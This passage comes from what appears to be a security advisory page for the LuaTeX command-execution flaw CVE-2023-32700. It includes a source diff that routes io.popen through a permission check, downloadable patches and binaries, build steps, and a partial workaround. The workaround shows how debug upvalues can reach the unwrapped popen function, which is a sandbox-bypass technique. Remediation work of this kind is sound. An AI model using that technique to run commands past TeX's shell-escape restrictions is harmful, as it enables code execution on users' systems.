</span><span class="token prefix inserted">+</span><span class="token line">        char *cmdname = NULL;
</span><span class="token prefix inserted">+</span><span class="token line">        switch (shell_cmd_is_allowed(filename, &amp;safecmd, &amp;cmdname)) {
</span><span class="token prefix inserted">+</span><span class="token line">            case 0:
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushboolean(L,0);
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushliteral(L, "specific command execution disabled");
</span><span class="token prefix inserted">+</span><span class="token line">                break;
</span><span class="token prefix inserted">+</span><span class="token line">            case 1:
</span><span class="token prefix inserted">+</span><span class="token line">                /* doesn't happen */
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushboolean(L,1);
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushstring(L,filename);
</span><span class="token prefix inserted">+</span><span class="token line">                break;
</span><span class="token prefix inserted">+</span><span class="token line">            case 2:
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushboolean(L,1);
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushstring(L,safecmd);
</span><span class="token prefix inserted">+</span><span class="token line">                break;
</span><span class="token prefix inserted">+</span><span class="token line">            default:
</span><span class="token prefix inserted">+</span><span class="token line">                /* -1 */
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushboolean(L,0);
</span><span class="token prefix inserted">+</span><span class="token line">                lua_pushliteral(L, "bad command line quoting");
</span><span class="token prefix inserted">+</span><span class="token line">                break;
</span><span class="token prefix inserted">+</span><span class="token line">        }
</span><span class="token prefix inserted">+</span><span class="token line">    }
</span><span class="token prefix inserted">+</span><span class="token line">    return 2;
</span><span class="token prefix inserted">+</span><span class="token line">}
</span><span class="token prefix inserted">+</span><span class="token line">static int io_kpse_popen (lua_State *L) {
</span><span class="token prefix inserted">+</span><span class="token line">  const char *filename = NULL;
</span><span class="token prefix inserted">+</span><span class="token line">  const char *mode = NULL;
</span><span class="token prefix inserted">+</span><span class="token line">  LStream *p = NULL;
</span><span class="token prefix inserted">+</span><span class="token line">  int okay;
</span><span class="token prefix inserted">+</span><span class="token line">  filename = luaL_checkstring(L, 1);
</span><span class="token prefix inserted">+</span><span class="token line">  mode = luaL_optstring(L, 2, "r");
</span><span class="token prefix inserted">+</span><span class="token line">  lua_pushstring(L,filename);
</span><span class="token prefix inserted">+</span><span class="token line">  io_kpse_check_permissions(L);
</span><span class="token prefix inserted">+</span><span class="token line">  filename = luaL_checkstring(L, -1);
</span><span class="token prefix inserted">+</span><span class="token line">  okay = lua_toboolean(L,-2);
</span><span class="token prefix inserted">+</span><span class="token line">  if (okay &amp;&amp; filename) {
</span><span class="token prefix inserted">+</span><span class="token line">    p = newprefile(L);
</span><span class="token prefix inserted">+</span><span class="token line">    luaL_argcheck(L, ((mode[0] == 'r' || mode[0] == 'w') &amp;&amp; mode[1] == '\0'),
</span><span class="token prefix inserted">+</span><span class="token line">		  2, "invalid mode");
</span><span class="token prefix inserted">+</span><span class="token line">    p->f = l_kpse_popen(L, filename, mode);
</span><span class="token prefix inserted">+</span><span class="token line">    p->closef = &amp;io_kpse_pclose;
</span><span class="token prefix inserted">+</span><span class="token line">    return (p->f == NULL) ? luaL_fileresult(L, 0, filename) : 1;
</span><span class="token prefix inserted">+</span><span class="token line">  } else {
</span><span class="token prefix inserted">+</span><span class="token line">    lua_pushnil(L);
</span><span class="token prefix inserted">+</span><span class="token line">    lua_pushvalue(L,-2);
</span><span class="token prefix inserted">+</span><span class="token line">    return 2;
</span><span class="token prefix inserted">+</span><span class="token line">  }
</span><span class="token prefix inserted">+</span><span class="token line">}
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void open_oslibext(lua_State * L)
</span><span class="token prefix unchanged"> </span><span class="token line">{
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>@@ -1080,6 +1185,8 @@ void open_oslibext(lua_State * L)
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    lua_setfield(L, -2, "execute");
</span><span class="token prefix unchanged"> </span><span class="token line">    lua_pushcfunction(L, os_tmpdir);
</span><span class="token prefix unchanged"> </span><span class="token line">    lua_setfield(L, -2, "tmpdir");
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    lua_pushcfunction(L, io_kpse_popen);
</span><span class="token prefix inserted">+</span><span class="token line">    lua_setfield(L, -2, "kpsepopen");
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">    lua_pop(L, 1);              /* pop the table */
</span><span class="token prefix unchanged"> </span><span class="token line">}
</span></span>diff --git a/source/texk/web2c/luatexdir/lua/luatex-core.lua b/source/texk/web2c/luatexdir/lua/luatex-core.lua
<span class="token coord">--- a/source/texk/web2c/luatexdir/lua/luatex-core.lua</span>
<span class="token coord">+++ b/source/texk/web2c/luatexdir/lua/luatex-core.lua</span>
@@ -34,7 +34,6 @@ if kpseused == 1 then
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    local kpse_recordoutputfile = kpse.record_output_file
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">    local io_open               = io.open
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    local io_popen              = io.popen
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    local io_lines              = io.lines
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">    local fio_readline          = fio.readline
</span></span>@@ -75,12 +74,6 @@ if kpseused == 1 then
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">        return f
</span><span class="token prefix unchanged"> </span><span class="token line">    end
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    local function luatex_io_popen(name,...)
</span><span class="token prefix deleted">-</span><span class="token line">        local okay, found = kpse_checkpermission(name)
</span><span class="token prefix deleted">-</span><span class="token line">        if okay and found then
</span><span class="token prefix deleted">-</span><span class="token line">            return io_popen(found,...)
</span><span class="token prefix deleted">-</span><span class="token line">        end
</span><span class="token prefix deleted">-</span><span class="token line">    end
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">    -- local function luatex_io_lines(name,how)
</span><span class="token prefix unchanged"> </span><span class="token line">    --     if name then
</span></span>@@ -130,7 +123,7 @@ if kpseused == 1 then
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    mt.lines = luatex_io_readline
</span><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">    io.open  = luatex_io_open
</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">    io.popen = luatex_io_popen
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    io.popen = os.kpsepopen
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">
</span><span class="token prefix unchanged"> </span><span class="token line">else
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span>@@ -169,6 +162,8 @@ if saferoption == 1 then
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    os.setenv  = installdummy("os.setenv")
</span><span class="token prefix unchanged"> </span><span class="token line">    os.tempdir = installdummy("os.tempdir")
</span><span class="token prefix unchanged"> </span><span class="token line">
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">    os.kpsepopen = installdummy("os.kpsepopen")
</span><span class="token prefix inserted">+</span><span class="token line">
</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    io.popen   = installdummy("io.popen")
</span><span class="token prefix unchanged"> </span><span class="token line">    io.open    = installdummy("io.open",luatex_io_open_readonly)
</span></span></code></pre>

<p>Aside from patching this security vulnerability, this patch will not cause
any observable changes in LuaTeX’s behaviour.</p>

<p>After applying the <code>diff</code>, you will need to run</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> source/texk/web2c/luatexdir/lua/</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">mtxrun <span class="token parameter variable">--script</span> luatex-core.lua</span></span>
</code></pre>

<p>before you can build your LuaTeX binaries. Once built, verify that you are no
longer vulnerable by running the exploit code at the top of this document.

<span class="sidenote">
    This step is required to update <code>luatex-core.c</code> which cannot be
    cleanly <code>diff</code>ed.
</span>
</p>

<p>If you encounter any difficulties, you can ask for help on either the <a
href="https://mailman.ntg.nl/mailman/listinfo/dev-luatex">LuaTeX developers list
(<code>dev-luatex@ntg.nl</code>)</a> or the <a
href="https://tug.org/mailman/listinfo/tlbuild">TeX Live builders list
(<code>tlbuild@tug.org</code>)</a>.</p>

<h4 id="patches-for-specific">Patches for Specific Versions</h4>

<p>The above patch cleanly applies only to recent TeX Live versions. In
addition, using the above patch requires a working ConTeXt installation to run
<code>mtxrun</code>.</p>

<p>For each of the TeX Live versions listed below, you can simply apply the
linked patches to your current source and recompile, with no additional steps
needed. Additionally, I have provided patched binaries for select systems. </p>

<p>These patches/binaries only contain the fix for CVE-2023-32700
(<code>popen</code>); they do <em>not</em> any fixes for CVE-2023-32668
(<code>socket</code>).</p>

<dl class="bold">
    <dt>TeX Live 2017</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.0.4</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaJITTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2017-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>4.8.5</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2017-win32-luatex.tar.xz">Windows <code>x86</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2017/patch">Complete Patch</a></dt>
    </dl></dd>
    <dt>TeX Live 2018</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.07.0</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaJITTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2018-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>4.8.5</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2018-win32-luatex.tar.xz">Windows <code>x86</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2018/patch">Complete Patch</a></dt>
    </dl></dd>
    <dt>TeX Live 2019</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.10.0</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaJITTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2019-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>4.8.5</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2019-win32-luatex.tar.xz">Windows <code>x86</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2019/patch">Complete Patch</a></dt>
    </dl></dd>
    <dt>TeX Live 2020</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.12.0</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaHBTeX</li>
                <li>LuaJITTeX</li>
                <li>LuaJITHBTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2020-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>10.2.1</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2020-win32-luatex.tar.xz">Windows <code>x86</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2020/patch">Complete Patch</a></dt>
    </dl></dd>
    <dt>TeX Live 2021</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.13.0</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaHBTeX</li>
                <li>LuaJITTeX</li>
                <li>LuaJITHBTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2021-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>10.2.1</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2021-win32-luatex.tar.xz">Windows <code>x86</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2021/patch">Complete Patch</a></dt>
    </dl></dd>
    <dt>TeX Live 2022</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.15.0</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaHBTeX</li>
                <li>LuaJITTeX</li>
                <li>LuaJITHBTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2022-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>10.2.1</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2022-win32-luatex.tar.xz">Windows <code>x86</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2022/patch">Complete Patch</a></dt>
    </dl></dd>
    <dt>TeX Live 2023</dt>
    <dd><dl>
        <dt>LuaTeX Version</dt>
        <dd><code>1.16.0</code></dd>
        <dt>Programs Built</dt>
        <dd>
            <ul class="inline">
                <li>LuaTeX</li>
                <li>LuaHBTeX</li>
                <li>LuaJITTeX</li>
                <li>LuaJITHBTeX</li>
            </ul>
        </dd>
        <dt>Binary Downloads</dt>
        <dd>
            <ul>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2023-x86_64-linux-luatex.tar.xz">Linux <code>x86_64</code></a> (CentOS 7, <abbr>GCC</abbr> <code>10.2.1</code>)</li>
                <li><a href="https://tug.org/~mseven/luatex-files/archives/texlive2023-windows-luatex.tar.xz">Windows <code>x86_64</code></a> (Mingw-w64 <code>5.0</code>, <abbr>GCC</abbr> <code>7.3</code>)</li>
            </ul>
        </dd>
        <dt><a href="https://tug.org/~mseven/luatex-files/2023/patch">Complete Patch</a></dt>
    </dl></dd>
</dl>

<details>
    <summary><h4 id="binary-details">Binary Compilation Details</h4></summary>
    <p>Below I’ll list the exact steps I used to compile the binaries linked
    above. This is only relevant if you want to exactly reproduce the binaries
    linked above; if you’re maintaining a Linux/<abbr>BSD</abbr> distribution,
    you should just apply the patches above then use your normal TeX Live build
    process.</p>
    <h5>General</h5>
    <p>Download the source code:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">curl</span> <span class="token string">'https://tug.org/~mseven/luatex-files/20[17-23]/patch'</span> <span class="token parameter variable">-o</span> <span class="token string">'20#1.patch'</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> init luatex</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token builtin class-name">cd</span> luatex</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> fetch <span class="token parameter variable">--depth</span> <span class="token number">1</span> <span class="token string">'https://gitlab.lisn.upsaclay.fr/texlive/luatex.git'</span> tag <span class="token number">1.0</span>.4 tag <span class="token number">1.07</span>.0 tag <span class="token number">1.10</span>.0 tag <span class="token number">1.12</span>.0 tag <span class="token number">1.13</span>.0 tag <span class="token number">1.15</span>.0 tag <span class="token number">1.16</span>.0</span></span>
</code></pre>

<h5>Linux <code>x86_64</code></h5>

<p>Since linking with <code>glibc</code> is only backwards compatible
(<em>not</em> forwards compatible), you need to build Linux binaries on the
oldest system that you plan on supporting. In 2023, this is typically
CentOS 7.</p>

<p>Recent versions of LuaTeX won’t build with the default CentOS 7 compiler
because it’s too old, so you’ll need to install
<code>devtoolset-10</code>. But older versions of LuaTeX won’t build with
the newer compilers, so you’ll also need the standard compiler
installed.</p>

<p>Otherwise, building is fairly simple:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> checkout <span class="token number">1.0</span>.4</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> apply <span class="token punctuation">..</span>/2017.patch</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./build.sh <span class="token parameter variable">--parallel</span> <span class="token parameter variable">--jit</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">mkdir</span> <span class="token punctuation">..</span>/2017</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cp</span> build/texk/web2c/luatex build/texk/web2c/luajittex <span class="token punctuation">..</span>/2017</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> @<span class="token punctuation">;</span> <span class="token function">git</span> clean <span class="token parameter variable">-fdx</span></span></span>
<span class="token output">(repeat for 2018/1.07.0 and 2019/1.10.0)

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> checkout <span class="token number">1.12</span>.0</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> apply <span class="token punctuation">..</span>/2020.patch</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span>/opt/rh/devtoolset-10/root/usr/bin:/bin ./build.sh <span class="token parameter variable">--parallel</span> <span class="token parameter variable">--jit</span> <span class="token parameter variable">--luahb</span> <span class="token parameter variable">--jithb</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">mkdir</span> <span class="token punctuation">..</span>/2020</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cp</span> build/texk/web2c/luatex build/texk/web2c/luajittex build/texk/web2c/luahbtex build/texk/web2c/luajithbtex <span class="token punctuation">..</span>/2020</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> @<span class="token punctuation">;</span> <span class="token function">git</span> clean <span class="token parameter variable">-fdx</span></span></span>
<span class="token output">(repeat for 2021/1.13.0, 2022/1.15.0, and 2023/1.16.0)
</span></code></pre>

<p>I’ve done some basic testing with most of the binaries, and everything
seems to work as expected. I don’t expect for there to be any issues, but
use at your own risk.</p>

<h5>Windows</h5>

<p>Windows has a stable <abbr>ABI</abbr>, so we can build on any version
without any issues. We need a different system this time though since
CentOS 7 doesn’t package Mingw-w64. I used Ubuntu 18.04, but other distros
should work too.</p>

<p>The annoying part here is that TeX Live 2017–2022 compiled binaries for
<code>x86</code>, while TeX Live 2023 compiled binaries for
<code>x86_64</code>, so we need to install both Mingw-w64 <code>x86</code>
and Mingw-w64 <code>x86_64</code>. The TeX Live build process also needs
a native compiler, so we need to install a native Linux <abbr>GCC</abbr>.
And cross-compiling Lua<abbr>JIT</abbr>
requires that your native system has the same pointer size as the
destination system, so we also need to install a 32-bit Linux
<abbr>GCC</abbr>. Luckily, the <abbr>GCC</abbr> version in Ubuntu 18.04
works for compiling both new and old versions of LuaTeX; otherwise we’d need
<em>eight</em> different compilers.</p>

<p>There are two more complications. First, the binaries want to dynamically
link to <code>libc++</code> and <code>libgcc</code>, so we need to modify
the build script to force static linkage. Second, the version of Mingw-w64
in Ubuntu 18.04 is too old to recognize the constant
<code>PROCESSOR_ARCHITECTURE_ARM64</code>, so we need to manually hard code
this.</p>

<p>Otherwise, building is fairly straightforward:</p>

<pre><code><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> checkout <span class="token number">1.0</span>.4</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> apply <span class="token punctuation">..</span>/2017.patch</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/2621440/2621440 -static-libgcc -static-libstdc++/'</span> ./build.sh  <span class="token comment"># Force a static build</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./build.sh <span class="token parameter variable">--mingw32</span> <span class="token parameter variable">--jit</span> <span class="token parameter variable">--parallel</span> <span class="token parameter variable">--build</span><span class="token operator">=</span>i686-unknown-linux-gnu</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">mkdir</span> <span class="token punctuation">..</span>/2017</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cp</span> build-windows/texk/web2c/luajittex.exe build-windows/texk/web2c/luatex.exe <span class="token punctuation">..</span>/2017</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> @<span class="token punctuation">;</span> <span class="token function">git</span> clean <span class="token parameter variable">-fdx</span></span></span>
<span class="token output">(repeat for 2018/1.07.0 and 2019/1.10.0)

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> checkout <span class="token number">1.12</span>.0</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> apply <span class="token punctuation">..</span>/2020.patch</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/2621440/2621440 -static-libgcc -static-libstdc++/'</span> ./build.sh  <span class="token comment"># Force a static build</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/PROCESSOR_ARCHITECTURE_ARM64/12/'</span> source/texk/web2c/luatexdir/lua/loslibext.c  <span class="token comment"># Fix for older versions of Mingw-w64</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./build.sh <span class="token parameter variable">--mingw32</span> <span class="token parameter variable">--jit</span> <span class="token parameter variable">--luahb</span> <span class="token parameter variable">--jithb</span> <span class="token parameter variable">--parallel</span> <span class="token parameter variable">--build</span><span class="token operator">=</span>i686-unknown-linux-gnu</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">mkdir</span> <span class="token punctuation">..</span>/2020</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cp</span> build-windows32/texk/web2c/luajittex.exe build-windows32/texk/web2c/luatex.exe build-windows32/texk/web2c/luajithbtex.exe build-windows32/texk/web2c/luahbtex.exe <span class="token punctuation">..</span>/2020</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> @<span class="token punctuation">;</span> <span class="token function">git</span> clean <span class="token parameter variable">-fdx</span></span></span>
<span class="token output">(repeat for 2021/1.13.0 and 2022/1.15.0)

</span><span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> checkout <span class="token number">1.16</span>.0</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> apply <span class="token punctuation">..</span>/2023.patch</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/2621440/2621440 -static-libgcc -static-libstdc++/'</span> ./build.sh  <span class="token comment"># Force a static build</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">sed</span> <span class="token parameter variable">-i</span> <span class="token string">'s/PROCESSOR_ARCHITECTURE_ARM64/12/'</span> source/texk/web2c/luatexdir/lua/loslibext.c  <span class="token comment"># Fix for older versions of Mingw-w64</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash">./build.sh <span class="token parameter variable">--mingw64</span> <span class="token parameter variable">--jit</span> <span class="token parameter variable">--luahb</span> <span class="token parameter variable">--jithb</span> <span class="token parameter variable">--parallel</span></span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">mkdir</span> <span class="token punctuation">..</span>/2023</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">cp</span> build-windows64/texk/web2c/luajittex.exe build-windows64/texk/web2c/luatex.exe build-windows64/texk/web2c/luajithbtex.exe build-windows64/texk/web2c/luahbtex.exe <span class="token punctuation">..</span>/2023</span></span>
<span class="token command"><span class="token shell-symbol important">$</span> <span class="token bash language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> @<span class="token punctuation">;</span> <span class="token function">git</span> clean <span class="token parameter variable">-fdx</span></span></span>
</code></pre>


<p>I’ve only tested these binaries with Wine, but everything seems to work
as expected. I don’t expect for there to be any issues, but again, use at
your own risk.</p>

</details>

<h4 id="patching-no-bin">Patching <em>Without</em> Modifying Binaries</h4>

<p>If you absolutely cannot change your current LuaTeX binaries, the following
patch will provide protection against the exploit:</p>

<pre class="scroll"><code><span class="token coord">--- texmf-dist/tex/generic/tex-ini-files/luatexconfig.tex</span>
<span class="token coord">+++ texmf-dist/tex/generic/tex-ini-files/luatexconfig.tex</span>
<span class="token coord">@@ -66,4 +66,50 @@</span>
<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  \global\let\pageheight\undefined
</span><span class="token prefix unchanged"> </span><span class="token line">  \global\let\pagewidth\undefined
</span><span class="token prefix unchanged"> </span><span class="token line">  \global\let\dvimode\undefined
</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  % \global\everyjob{\directlua{
</span><span class="token prefix inserted">+</span><span class="token line">  %   do
</span><span class="token prefix inserted">+</span><span class="token line">  %     local getupvalue = debug.getupvalue
</span><span class="token prefix inserted">+</span><span class="token line">  %     local setupvalue = debug.setupvalue
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  %     local function get_upvalue(func, name)
</span><span class="token prefix inserted">+</span><span class="token line">  %         local nups = debug.getinfo(func).nups
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  %         for i = 1, nups do
</span><span class="token prefix inserted">+</span><span class="token line">  %             local current, value = getupvalue(func, i)
</span><span class="token prefix inserted">+</span><span class="token line">  %             if current == name then
</span><span class="token prefix inserted">+</span><span class="token line">  %                 return value
</span><span class="token prefix inserted">+</span><span class="token line">  %             end
</span><span class="token prefix inserted">+</span><span class="token line">  %         end
</span><span class="token prefix inserted">+</span><span class="token line">  %     end
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  %     local popen_wrapper = get_upvalue(io.popen, "popen")
</span><span class="token prefix inserted">+</span><span class="token line">  %     local popen = get_upvalue(popen_wrapper or io.popen, "io_popen")
</span><span class="token prefix inserted">+</span><span class="token line">  %     print("&lt;&lt;&lt;", popen, ">>>")
</span><span class="token prefix inserted">+</span><span class="token line">  %     local do_nothing = function() end
</span><span class="token prefix inserted">+</span><span class="token line">
</span><span class="token prefix inserted">+</span><span class="token line">  %     local function checked_getupvalue(...)
</span><span class="token prefix inserted">+</span><span class="token line">  %         local name, value = getupvalue(...)
</span><span class="token prefix inserted">+</span><span class="token line">  %         if value == popen or
</span><span class="token prefix inserted">+</span><span class="token line">  %            value == getupvalue or
</span><span class="token prefix inserted">+</span><span class="token line">  %            value == setupvalue
</span><span class="token prefix inserted">+</span><span class="token line">  %         then
</span><span class="token prefix inserted">+</span><span class="token line">  %             return name, do_nothing
</span><span class="token prefix inserted">+</span><span class="token line">  %         else
</span><span class="token prefix inserted">+</span><span class="token line">  %             return name, value
</span><span class="token prefix inserted">+</span><span class="token line">  %         end
